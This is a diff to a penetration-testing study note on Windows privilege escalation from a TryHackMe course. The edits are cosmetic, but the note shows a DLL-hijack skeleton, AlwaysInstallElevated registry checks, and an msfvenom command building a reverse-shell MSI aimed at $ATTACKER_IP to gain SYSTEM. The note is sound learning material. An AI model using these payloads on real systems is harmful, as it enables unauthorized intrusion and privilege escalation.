@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2022-04-21-tryhackme-jr-penetrat
 author: 100007
 ---
 
-# TryHackMe: Jr. Penetration Tester
-
-**author:** Nathan Acks  
-**date:** 2022-04-21
-
 # Windows PrivEsc
 
 ## Introduction
@@ -104,11 +99,11 @@ A skeleton DLL:
 
 BOOL WINAPI DllMain
 (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
-if (dwReason == DLL_PROCESS_ATTACH) {
-system("cmd.exe /C whoami > C:\Temp\dll.txt");
-ExitProcess(0);
-}
-return TRUE;
+	if (dwReason == DLL_PROCESS_ATTACH) {
+		system("cmd.exe /C whoami > C:\Temp\dll.txt");
+		ExitProcess(0);
+	}
+	return TRUE;
 }
 ```
 
@@ -175,6 +170,7 @@ Exploits in this family are typically named “X Potato” after the first explo
 
 ```
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
 
@@ -182,8 +178,8 @@ Generate a malicious MSI file with msfvenom:
 
 ```
 msfvenom -p windows/x64/shell_reverse_tcp \
-LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \
--f msi -o $INSTALLER.msi
+	LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \
+		-f msi -o $INSTALLER.msi
 ```
 
 Then install on the target to gain SYSTEM:
